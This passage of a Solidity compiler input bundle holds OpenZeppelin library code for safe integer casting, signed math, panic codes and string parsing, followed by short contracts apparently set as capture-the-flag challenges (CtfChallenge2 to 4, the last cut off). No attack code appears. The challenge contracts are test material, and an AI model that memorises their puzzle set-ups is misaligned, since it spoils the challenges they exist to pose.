value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int152 from int256, reverting on\n     * overflow (when the input is less than smallest int152 or\n     * greater than largest int152).\n     *\n     * Counterpart to Solidity's `int152` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 152 bits\n     */\n    function toInt152(int256 value) internal pure returns (int152 downcasted) {\n        downcasted = int152(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(152, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int144 from int256, reverting on\n     * overflow (when the input is less than smallest int144 or\n     * greater than largest int144).\n     *\n     * Counterpart to Solidity's `int144` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 144 bits\n     */\n    function toInt144(int256 value) internal pure returns (int144 downcasted) {\n        downcasted = int144(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(144, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int136 from int256, reverting on\n     * overflow (when the input is less than smallest int136 or\n     * greater than largest int136).\n     *\n     * Counterpart to Solidity's `int136` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 136 bits\n     */\n    function toInt136(int256 value) internal pure returns (int136 downcasted) {\n        downcasted = int136(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(136, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int128 from int256, reverting on\n     * overflow (when the input is less than smallest int128 or\n     * greater than largest int128).\n     *\n     * Counterpart to Solidity's `int128` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 128 bits\n     */\n    function toInt128(int256 value) internal pure returns (int128 downcasted) {\n        downcasted = int128(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(128, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int120 from int256, reverting on\n     * overflow (when the input is less than smallest int120 or\n     * greater than largest int120).\n     *\n     * Counterpart to Solidity's `int120` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 120 bits\n     */\n    function toInt120(int256 value) internal pure returns (int120 downcasted) {\n        downcasted = int120(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(120, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int112 from int256, reverting on\n     * overflow (when the input is less than smallest int112 or\n     * greater than largest int112).\n     *\n     * Counterpart to Solidity's `int112` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 112 bits\n     */\n    function toInt112(int256 value) internal pure returns (int112 downcasted) {\n        downcasted = int112(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(112, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int104 from int256, reverting on\n     * overflow (when the input is less than smallest int104 or\n     * greater than largest int104).\n     *\n     * Counterpart to Solidity's `int104` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 104 bits\n     */\n    function toInt104(int256 value) internal pure returns (int104 downcasted) {\n        downcasted = int104(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(104, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int96 from int256, reverting on\n     * overflow (when the input is less than smallest int96 or\n     * greater than largest int96).\n     *\n     * Counterpart to Solidity's `int96` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 96 bits\n     */\n    function toInt96(int256 value) internal pure returns (int96 downcasted) {\n        downcasted = int96(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(96, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int88 from int256, reverting on\n     * overflow (when the input is less than smallest int88 or\n     * greater than largest int88).\n     *\n     * Counterpart to Solidity's `int88` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 88 bits\n     */\n    function toInt88(int256 value) internal pure returns (int88 downcasted) {\n        downcasted = int88(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(88, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int80 from int256, reverting on\n     * overflow (when the input is less than smallest int80 or\n     * greater than largest int80).\n     *\n     * Counterpart to Solidity's `int80` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 80 bits\n     */\n    function toInt80(int256 value) internal pure returns (int80 downcasted) {\n        downcasted = int80(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(80, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int72 from int256, reverting on\n     * overflow (when the input is less than smallest int72 or\n     * greater than largest int72).\n     *\n     * Counterpart to Solidity's `int72` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 72 bits\n     */\n    function toInt72(int256 value) internal pure returns (int72 downcasted) {\n        downcasted = int72(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(72, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int64 from int256, reverting on\n     * overflow (when the input is less than smallest int64 or\n     * greater than largest int64).\n     *\n     * Counterpart to Solidity's `int64` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 64 bits\n     */\n    function toInt64(int256 value) internal pure returns (int64 downcasted) {\n        downcasted = int64(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(64, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int56 from int256, reverting on\n     * overflow (when the input is less than smallest int56 or\n     * greater than largest int56).\n     *\n     * Counterpart to Solidity's `int56` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 56 bits\n     */\n    function toInt56(int256 value) internal pure returns (int56 downcasted) {\n        downcasted = int56(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(56, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int48 from int256, reverting on\n     * overflow (when the input is less than smallest int48 or\n     * greater than largest int48).\n     *\n     * Counterpart to Solidity's `int48` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 48 bits\n     */\n    function toInt48(int256 value) internal pure returns (int48 downcasted) {\n        downcasted = int48(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(48, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int40 from int256, reverting on\n     * overflow (when the input is less than smallest int40 or\n     * greater than largest int40).\n     *\n     * Counterpart to Solidity's `int40` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 40 bits\n     */\n    function toInt40(int256 value) internal pure returns (int40 downcasted) {\n        downcasted = int40(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(40, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int32 from int256, reverting on\n     * overflow (when the input is less than smallest int32 or\n     * greater than largest int32).\n     *\n     * Counterpart to Solidity's `int32` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 32 bits\n     */\n    function toInt32(int256 value) internal pure returns (int32 downcasted) {\n        downcasted = int32(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(32, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int24 from int256, reverting on\n     * overflow (when the input is less than smallest int24 or\n     * greater than largest int24).\n     *\n     * Counterpart to Solidity's `int24` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 24 bits\n     */\n    function toInt24(int256 value) internal pure returns (int24 downcasted) {\n        downcasted = int24(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(24, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int16 from int256, reverting on\n     * overflow (when the input is less than smallest int16 or\n     * greater than largest int16).\n     *\n     * Counterpart to Solidity's `int16` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 16 bits\n     */\n    function toInt16(int256 value) internal pure returns (int16 downcasted) {\n        downcasted = int16(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(16, value);\n        }\n    }\n\n    /**\n     * @dev Returns the downcasted int8 from int256, reverting on\n     * overflow (when the input is less than smallest int8 or\n     * greater than largest int8).\n     *\n     * Counterpart to Solidity's `int8` operator.\n     *\n     * Requirements:\n     *\n     * - input must fit into 8 bits\n     */\n    function toInt8(int256 value) internal pure returns (int8 downcasted) {\n        downcasted = int8(value);\n        if (downcasted != value) {\n            revert SafeCastOverflowedIntDowncast(8, value);\n        }\n    }\n\n    /**\n     * @dev Converts an unsigned uint256 into a signed int256.\n     *\n     * Requirements:\n     *\n     * - input must be less than or equal to maxInt256.\n     */\n    function toInt256(uint256 value) internal pure returns (int256) {\n        // Note: Unsafe cast below is okay because `type(int256).max` is guaranteed to be positive\n        if (value > uint256(type(int256).max)) {\n            revert SafeCastOverflowedUintToInt(value);\n        }\n        return int256(value);\n    }\n\n    /**\n     * @dev Cast a boolean (false or true) to a uint256 (0 or 1) with no jump.\n     */\n    function toUint(bool b) internal pure returns (uint256 u) {\n        assembly (\"memory-safe\") {\n            u := iszero(iszero(b))\n        }\n    }\n}\n"},"@openzeppelin/contracts/utils/math/SignedMath.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/math/SignedMath.sol)\n\npragma solidity ^0.8.20;\n\nimport {SafeCast} from \"./SafeCast.sol\";\n\n/**\n * @dev Standard signed math utilities missing in the Solidity language.\n */\nlibrary SignedMath {\n    /**\n     * @dev Branchless ternary evaluation for `a ? b : c`. Gas costs are constant.\n     *\n     * IMPORTANT: This function may reduce bytecode size and consume less gas when used standalone.\n     * However, the compiler may optimize Solidity ternary operations (i.e. `a ? b : c`) to only compute\n     * one branch when needed, making this function more expensive.\n     */\n    function ternary(bool condition, int256 a, int256 b) internal pure returns (int256) {\n        unchecked {\n            // branchless ternary works because:\n            // b ^ (a ^ b) == a\n            // b ^ 0 == b\n            return b ^ ((a ^ b) * int256(SafeCast.toUint(condition)));\n        }\n    }\n\n    /**\n     * @dev Returns the largest of two signed numbers.\n     */\n    function max(int256 a, int256 b) internal pure returns (int256) {\n        return ternary(a > b, a, b);\n    }\n\n    /**\n     * @dev Returns the smallest of two signed numbers.\n     */\n    function min(int256 a, int256 b) internal pure returns (int256) {\n        return ternary(a < b, a, b);\n    }\n\n    /**\n     * @dev Returns the average of two signed numbers without overflow.\n     * The result is rounded towards zero.\n     */\n    function average(int256 a, int256 b) internal pure returns (int256) {\n        // Formula from the book \"Hacker's Delight\"\n        int256 x = (a & b) + ((a ^ b) >> 1);\n        return x + (int256(uint256(x) >> 255) & (a ^ b));\n    }\n\n    /**\n     * @dev Returns the absolute unsigned value of a signed value.\n     */\n    function abs(int256 n) internal pure returns (uint256) {\n        unchecked {\n            // Formula from the \"Bit Twiddling Hacks\" by Sean Eron Anderson.\n            // Since `n` is a signed integer, the generated bytecode will use the SAR opcode to perform the right shift,\n            // taking advantage of the most significant (or \"sign\" bit) in two's complement representation.\n            // This opcode adds new most significant bits set to the value of the previous most significant bit. As a result,\n            // the mask will either be `bytes32(0)` (if n is positive) or `~bytes32(0)` (if n is negative).\n            int256 mask = n >> 255;\n\n            // A `bytes32(0)` mask leaves the input unchanged, while a `~bytes32(0)` mask complements it.\n            return uint256((n + mask) ^ mask);\n        }\n    }\n}\n"},"@openzeppelin/contracts/utils/Panic.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.1.0) (utils/Panic.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Helper library for emitting standardized panic codes.\n *\n * ```solidity\n * contract Example {\n *      using Panic for uint256;\n *\n *      // Use any of the declared internal constants\n *      function foo() { Panic.GENERIC.panic(); }\n *\n *      // Alternatively\n *      function foo() { Panic.panic(Panic.GENERIC); }\n * }\n * ```\n *\n * Follows the list from https://github.com/ethereum/solidity/blob/v0.8.24/libsolutil/ErrorCodes.h[libsolutil].\n *\n * _Available since v5.1._\n */\n// slither-disable-next-line unused-state\nlibrary Panic {\n    /// @dev generic / unspecified error\n    uint256 internal constant GENERIC = 0x00;\n    /// @dev used by the assert() builtin\n    uint256 internal constant ASSERT = 0x01;\n    /// @dev arithmetic underflow or overflow\n    uint256 internal constant UNDER_OVERFLOW = 0x11;\n    /// @dev division or modulo by zero\n    uint256 internal constant DIVISION_BY_ZERO = 0x12;\n    /// @dev enum conversion error\n    uint256 internal constant ENUM_CONVERSION_ERROR = 0x21;\n    /// @dev invalid encoding in storage\n    uint256 internal constant STORAGE_ENCODING_ERROR = 0x22;\n    /// @dev empty array pop\n    uint256 internal constant EMPTY_ARRAY_POP = 0x31;\n    /// @dev array out of bounds access\n    uint256 internal constant ARRAY_OUT_OF_BOUNDS = 0x32;\n    /// @dev resource error (too large allocation or too large array)\n    uint256 internal constant RESOURCE_ERROR = 0x41;\n    /// @dev calling invalid internal function\n    uint256 internal constant INVALID_INTERNAL_FUNCTION = 0x51;\n\n    /// @dev Reverts with a panic code. Recommended to use with\n    /// the internal constants with predefined codes.\n    function panic(uint256 code) internal pure {\n        assembly (\"memory-safe\") {\n            mstore(0x00, 0x4e487b71)\n            mstore(0x20, code)\n            revert(0x1c, 0x24)\n        }\n    }\n}\n"},"@openzeppelin/contracts/utils/Strings.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (utils/Strings.sol)\n\npragma solidity ^0.8.20;\n\nimport {Math} from \"./math/Math.sol\";\nimport {SafeCast} from \"./math/SafeCast.sol\";\nimport {SignedMath} from \"./math/SignedMath.sol\";\n\n/**\n * @dev String operations.\n */\nlibrary Strings {\n    using SafeCast for *;\n\n    bytes16 private constant HEX_DIGITS = \"0123456789abcdef\";\n    uint8 private constant ADDRESS_LENGTH = 20;\n    uint256 private constant SPECIAL_CHARS_LOOKUP =\n        (1 << 0x08) | // backspace\n            (1 << 0x09) | // tab\n            (1 << 0x0a) | // newline\n            (1 << 0x0c) | // form feed\n            (1 << 0x0d) | // carriage return\n            (1 << 0x22) | // double quote\n            (1 << 0x5c); // backslash\n\n    /**\n     * @dev The `value` string doesn't fit in the specified `length`.\n     */\n    error StringsInsufficientHexLength(uint256 value, uint256 length);\n\n    /**\n     * @dev The string being parsed contains characters that are not in scope of the given base.\n     */\n    error StringsInvalidChar();\n\n    /**\n     * @dev The string being parsed is not a properly formatted address.\n     */\n    error StringsInvalidAddressFormat();\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\n     */\n    function toString(uint256 value) internal pure returns (string memory) {\n        unchecked {\n            uint256 length = Math.log10(value) + 1;\n            string memory buffer = new string(length);\n            uint256 ptr;\n            assembly (\"memory-safe\") {\n                ptr := add(add(buffer, 0x20), length)\n            }\n            while (true) {\n                ptr--;\n                assembly (\"memory-safe\") {\n                    mstore8(ptr, byte(mod(value, 10), HEX_DIGITS))\n                }\n                value /= 10;\n                if (value == 0) break;\n            }\n            return buffer;\n        }\n    }\n\n    /**\n     * @dev Converts a `int256` to its ASCII `string` decimal representation.\n     */\n    function toStringSigned(int256 value) internal pure returns (string memory) {\n        return string.concat(value < 0 ? \"-\" : \"\", toString(SignedMath.abs(value)));\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\n     */\n    function toHexString(uint256 value) internal pure returns (string memory) {\n        unchecked {\n            return toHexString(value, Math.log256(value) + 1);\n        }\n    }\n\n    /**\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n     */\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\n        uint256 localValue = value;\n        bytes memory buffer = new bytes(2 * length + 2);\n        buffer[0] = \"0\";\n        buffer[1] = \"x\";\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\n            buffer[i] = HEX_DIGITS[localValue & 0xf];\n            localValue >>= 4;\n        }\n        if (localValue != 0) {\n            revert StringsInsufficientHexLength(value, length);\n        }\n        return string(buffer);\n    }\n\n    /**\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal\n     * representation.\n     */\n    function toHexString(address addr) internal pure returns (string memory) {\n        return toHexString(uint256(uint160(addr)), ADDRESS_LENGTH);\n    }\n\n    /**\n     * @dev Converts an `address` with fixed length of 20 bytes to its checksummed ASCII `string` hexadecimal\n     * representation, according to EIP-55.\n     */\n    function toChecksumHexString(address addr) internal pure returns (string memory) {\n        bytes memory buffer = bytes(toHexString(addr));\n\n        // hash the hex part of buffer (skip length + 2 bytes, length 40)\n        uint256 hashValue;\n        assembly (\"memory-safe\") {\n            hashValue := shr(96, keccak256(add(buffer, 0x22), 40))\n        }\n\n        for (uint256 i = 41; i > 1; --i) {\n            // possible values for buffer[i] are 48 (0) to 57 (9) and 97 (a) to 102 (f)\n            if (hashValue & 0xf > 7 && uint8(buffer[i]) > 96) {\n                // case shift by xoring with 0x20\n                buffer[i] ^= 0x20;\n            }\n            hashValue >>= 4;\n        }\n        return string(buffer);\n    }\n\n    /**\n     * @dev Returns true if the two strings are equal.\n     */\n    function equal(string memory a, string memory b) internal pure returns (bool) {\n        return bytes(a).length == bytes(b).length && keccak256(bytes(a)) == keccak256(bytes(b));\n    }\n\n    /**\n     * @dev Parse a decimal string and returns the value as a `uint256`.\n     *\n     * Requirements:\n     * - The string must be formatted as `[0-9]*`\n     * - The result must fit into an `uint256` type\n     */\n    function parseUint(string memory input) internal pure returns (uint256) {\n        return parseUint(input, 0, bytes(input).length);\n    }\n\n    /**\n     * @dev Variant of {parseUint-string} that parses a substring of `input` located between position `begin` (included) and\n     * `end` (excluded).\n     *\n     * Requirements:\n     * - The substring must be formatted as `[0-9]*`\n     * - The result must fit into an `uint256` type\n     */\n    function parseUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\n        (bool success, uint256 value) = tryParseUint(input, begin, end);\n        if (!success) revert StringsInvalidChar();\n        return value;\n    }\n\n    /**\n     * @dev Variant of {parseUint-string} that returns false if the parsing fails because of an invalid character.\n     *\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\n     */\n    function tryParseUint(string memory input) internal pure returns (bool success, uint256 value) {\n        return _tryParseUintUncheckedBounds(input, 0, bytes(input).length);\n    }\n\n    /**\n     * @dev Variant of {parseUint-string-uint256-uint256} that returns false if the parsing fails because of an invalid\n     * character.\n     *\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\n     */\n    function tryParseUint(\n        string memory input,\n        uint256 begin,\n        uint256 end\n    ) internal pure returns (bool success, uint256 value) {\n        if (end > bytes(input).length || begin > end) return (false, 0);\n        return _tryParseUintUncheckedBounds(input, begin, end);\n    }\n\n    /**\n     * @dev Implementation of {tryParseUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\n     */\n    function _tryParseUintUncheckedBounds(\n        string memory input,\n        uint256 begin,\n        uint256 end\n    ) private pure returns (bool success, uint256 value) {\n        bytes memory buffer = bytes(input);\n\n        uint256 result = 0;\n        for (uint256 i = begin; i < end; ++i) {\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\n            if (chr > 9) return (false, 0);\n            result *= 10;\n            result += chr;\n        }\n        return (true, result);\n    }\n\n    /**\n     * @dev Parse a decimal string and returns the value as a `int256`.\n     *\n     * Requirements:\n     * - The string must be formatted as `[-+]?[0-9]*`\n     * - The result must fit in an `int256` type.\n     */\n    function parseInt(string memory input) internal pure returns (int256) {\n        return parseInt(input, 0, bytes(input).length);\n    }\n\n    /**\n     * @dev Variant of {parseInt-string} that parses a substring of `input` located between position `begin` (included) and\n     * `end` (excluded).\n     *\n     * Requirements:\n     * - The substring must be formatted as `[-+]?[0-9]*`\n     * - The result must fit in an `int256` type.\n     */\n    function parseInt(string memory input, uint256 begin, uint256 end) internal pure returns (int256) {\n        (bool success, int256 value) = tryParseInt(input, begin, end);\n        if (!success) revert StringsInvalidChar();\n        return value;\n    }\n\n    /**\n     * @dev Variant of {parseInt-string} that returns false if the parsing fails because of an invalid character or if\n     * the result does not fit in a `int256`.\n     *\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\n     */\n    function tryParseInt(string memory input) internal pure returns (bool success, int256 value) {\n        return _tryParseIntUncheckedBounds(input, 0, bytes(input).length);\n    }\n\n    uint256 private constant ABS_MIN_INT256 = 2 ** 255;\n\n    /**\n     * @dev Variant of {parseInt-string-uint256-uint256} that returns false if the parsing fails because of an invalid\n     * character or if the result does not fit in a `int256`.\n     *\n     * NOTE: This function will revert if the absolute value of the result does not fit in a `uint256`.\n     */\n    function tryParseInt(\n        string memory input,\n        uint256 begin,\n        uint256 end\n    ) internal pure returns (bool success, int256 value) {\n        if (end > bytes(input).length || begin > end) return (false, 0);\n        return _tryParseIntUncheckedBounds(input, begin, end);\n    }\n\n    /**\n     * @dev Implementation of {tryParseInt-string-uint256-uint256} that does not check bounds. Caller should make sure that\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\n     */\n    function _tryParseIntUncheckedBounds(\n        string memory input,\n        uint256 begin,\n        uint256 end\n    ) private pure returns (bool success, int256 value) {\n        bytes memory buffer = bytes(input);\n\n        // Check presence of a negative sign.\n        bytes1 sign = begin == end ? bytes1(0) : bytes1(_unsafeReadBytesOffset(buffer, begin)); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\n        bool positiveSign = sign == bytes1(\"+\");\n        bool negativeSign = sign == bytes1(\"-\");\n        uint256 offset = (positiveSign || negativeSign).toUint();\n\n        (bool absSuccess, uint256 absValue) = tryParseUint(input, begin + offset, end);\n\n        if (absSuccess && absValue < ABS_MIN_INT256) {\n            return (true, negativeSign ? -int256(absValue) : int256(absValue));\n        } else if (absSuccess && negativeSign && absValue == ABS_MIN_INT256) {\n            return (true, type(int256).min);\n        } else return (false, 0);\n    }\n\n    /**\n     * @dev Parse a hexadecimal string (with or without \"0x\" prefix), and returns the value as a `uint256`.\n     *\n     * Requirements:\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]*`\n     * - The result must fit in an `uint256` type.\n     */\n    function parseHexUint(string memory input) internal pure returns (uint256) {\n        return parseHexUint(input, 0, bytes(input).length);\n    }\n\n    /**\n     * @dev Variant of {parseHexUint-string} that parses a substring of `input` located between position `begin` (included) and\n     * `end` (excluded).\n     *\n     * Requirements:\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]*`\n     * - The result must fit in an `uint256` type.\n     */\n    function parseHexUint(string memory input, uint256 begin, uint256 end) internal pure returns (uint256) {\n        (bool success, uint256 value) = tryParseHexUint(input, begin, end);\n        if (!success) revert StringsInvalidChar();\n        return value;\n    }\n\n    /**\n     * @dev Variant of {parseHexUint-string} that returns false if the parsing fails because of an invalid character.\n     *\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\n     */\n    function tryParseHexUint(string memory input) internal pure returns (bool success, uint256 value) {\n        return _tryParseHexUintUncheckedBounds(input, 0, bytes(input).length);\n    }\n\n    /**\n     * @dev Variant of {parseHexUint-string-uint256-uint256} that returns false if the parsing fails because of an\n     * invalid character.\n     *\n     * NOTE: This function will revert if the result does not fit in a `uint256`.\n     */\n    function tryParseHexUint(\n        string memory input,\n        uint256 begin,\n        uint256 end\n    ) internal pure returns (bool success, uint256 value) {\n        if (end > bytes(input).length || begin > end) return (false, 0);\n        return _tryParseHexUintUncheckedBounds(input, begin, end);\n    }\n\n    /**\n     * @dev Implementation of {tryParseHexUint-string-uint256-uint256} that does not check bounds. Caller should make sure that\n     * `begin <= end <= input.length`. Other inputs would result in undefined behavior.\n     */\n    function _tryParseHexUintUncheckedBounds(\n        string memory input,\n        uint256 begin,\n        uint256 end\n    ) private pure returns (bool success, uint256 value) {\n        bytes memory buffer = bytes(input);\n\n        // skip 0x prefix if present\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(buffer, begin)) == bytes2(\"0x\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\n        uint256 offset = hasPrefix.toUint() * 2;\n\n        uint256 result = 0;\n        for (uint256 i = begin + offset; i < end; ++i) {\n            uint8 chr = _tryParseChr(bytes1(_unsafeReadBytesOffset(buffer, i)));\n            if (chr > 15) return (false, 0);\n            result *= 16;\n            unchecked {\n                // Multiplying by 16 is equivalent to a shift of 4 bits (with additional overflow check).\n                // This guarantees that adding a value < 16 will not cause an overflow, hence the unchecked.\n                result += chr;\n            }\n        }\n        return (true, result);\n    }\n\n    /**\n     * @dev Parse a hexadecimal string (with or without \"0x\" prefix), and returns the value as an `address`.\n     *\n     * Requirements:\n     * - The string must be formatted as `(0x)?[0-9a-fA-F]{40}`\n     */\n    function parseAddress(string memory input) internal pure returns (address) {\n        return parseAddress(input, 0, bytes(input).length);\n    }\n\n    /**\n     * @dev Variant of {parseAddress-string} that parses a substring of `input` located between position `begin` (included) and\n     * `end` (excluded).\n     *\n     * Requirements:\n     * - The substring must be formatted as `(0x)?[0-9a-fA-F]{40}`\n     */\n    function parseAddress(string memory input, uint256 begin, uint256 end) internal pure returns (address) {\n        (bool success, address value) = tryParseAddress(input, begin, end);\n        if (!success) revert StringsInvalidAddressFormat();\n        return value;\n    }\n\n    /**\n     * @dev Variant of {parseAddress-string} that returns false if the parsing fails because the input is not a properly\n     * formatted address. See {parseAddress-string} requirements.\n     */\n    function tryParseAddress(string memory input) internal pure returns (bool success, address value) {\n        return tryParseAddress(input, 0, bytes(input).length);\n    }\n\n    /**\n     * @dev Variant of {parseAddress-string-uint256-uint256} that returns false if the parsing fails because input is not a properly\n     * formatted address. See {parseAddress-string-uint256-uint256} requirements.\n     */\n    function tryParseAddress(\n        string memory input,\n        uint256 begin,\n        uint256 end\n    ) internal pure returns (bool success, address value) {\n        if (end > bytes(input).length || begin > end) return (false, address(0));\n\n        bool hasPrefix = (end > begin + 1) && bytes2(_unsafeReadBytesOffset(bytes(input), begin)) == bytes2(\"0x\"); // don't do out-of-bound (possibly unsafe) read if sub-string is empty\n        uint256 expectedLength = 40 + hasPrefix.toUint() * 2;\n\n        // check that input is the correct length\n        if (end - begin == expectedLength) {\n            // length guarantees that this does not overflow, and value is at most type(uint160).max\n            (bool s, uint256 v) = _tryParseHexUintUncheckedBounds(input, begin, end);\n            return (s, address(uint160(v)));\n        } else {\n            return (false, address(0));\n        }\n    }\n\n    function _tryParseChr(bytes1 chr) private pure returns (uint8) {\n        uint8 value = uint8(chr);\n\n        // Try to parse `chr`:\n        // - Case 1: [0-9]\n        // - Case 2: [a-f]\n        // - Case 3: [A-F]\n        // - otherwise not supported\n        unchecked {\n            if (value > 47 && value < 58) value -= 48;\n            else if (value > 96 && value < 103) value -= 87;\n            else if (value > 64 && value < 71) value -= 55;\n            else return type(uint8).max;\n        }\n\n        return value;\n    }\n\n    /**\n     * @dev Escape special characters in JSON strings. This can be useful to prevent JSON injection in NFT metadata.\n     *\n     * WARNING: This function should only be used in double quoted JSON strings. Single quotes are not escaped.\n     *\n     * NOTE: This function escapes all unicode characters, and not just the ones in ranges defined in section 2.5 of\n     * RFC-4627 (U+0000 to U+001F, U+0022 and U+005C). ECMAScript's `JSON.parse` does recover escaped unicode\n     * characters that are not in this range, but other tooling may provide different results.\n     */\n    function escapeJSON(string memory input) internal pure returns (string memory) {\n        bytes memory buffer = bytes(input);\n        bytes memory output = new bytes(2 * buffer.length); // worst case scenario\n        uint256 outputLength = 0;\n\n        for (uint256 i; i < buffer.length; ++i) {\n            bytes1 char = bytes1(_unsafeReadBytesOffset(buffer, i));\n            if (((SPECIAL_CHARS_LOOKUP & (1 << uint8(char))) != 0)) {\n                output[outputLength++] = \"\\\\\";\n                if (char == 0x08) output[outputLength++] = \"b\";\n                else if (char == 0x09) output[outputLength++] = \"t\";\n                else if (char == 0x0a) output[outputLength++] = \"n\";\n                else if (char == 0x0c) output[outputLength++] = \"f\";\n                else if (char == 0x0d) output[outputLength++] = \"r\";\n                else if (char == 0x5c) output[outputLength++] = \"\\\\\";\n                else if (char == 0x22) {\n                    // solhint-disable-next-line quotes\n                    output[outputLength++] = '\"';\n                }\n            } else {\n                output[outputLength++] = char;\n            }\n        }\n        // write the actual length and deallocate unused memory\n        assembly (\"memory-safe\") {\n            mstore(output, outputLength)\n            mstore(0x40, add(output, shl(5, shr(5, add(outputLength, 63)))))\n        }\n\n        return string(output);\n    }\n\n    /**\n     * @dev Reads a bytes32 from a bytes array without bounds checking.\n     *\n     * NOTE: making this function internal would mean it could be used with memory unsafe offset, and marking the\n     * assembly block as such would prevent some optimizations.\n     */\n    function _unsafeReadBytesOffset(bytes memory buffer, uint256 offset) private pure returns (bytes32 value) {\n        // This is not memory safe in the general case, but all calls to this private function are within bounds.\n        assembly (\"memory-safe\") {\n            value := mload(add(add(buffer, 0x20), offset))\n        }\n    }\n}\n"},"contracts/CtfChallenge2.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.28;\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\n\n// Uncomment this line to use console.log\n// import \"hardhat/console.sol\";\n\ncontract CtfChallenge2 is Ownable {\n  constructor() Ownable(msg.sender) {}\n\n  function indirectCall(address target) public onlyOwner {\n    ITarget(target).justCallMe();\n  }\n}\n\ninterface ITarget {\n  function justCallMe() external;\n}\n"},"contracts/CtfChallenge3.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.28;\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\n\n// Uncomment this line to use console.log\n// import \"hardhat/console.sol\";\n\ncontract CtfChallenge3 is Ownable {\n  constructor(address target) Ownable(msg.sender) {\n    ITarget(target).mintFlag();\n  }\n\n}\n\ninterface ITarget {\n  function mintFlag() external;\n}\n"},"contracts/CtfChallenge4.sol":{"content":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.28;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport 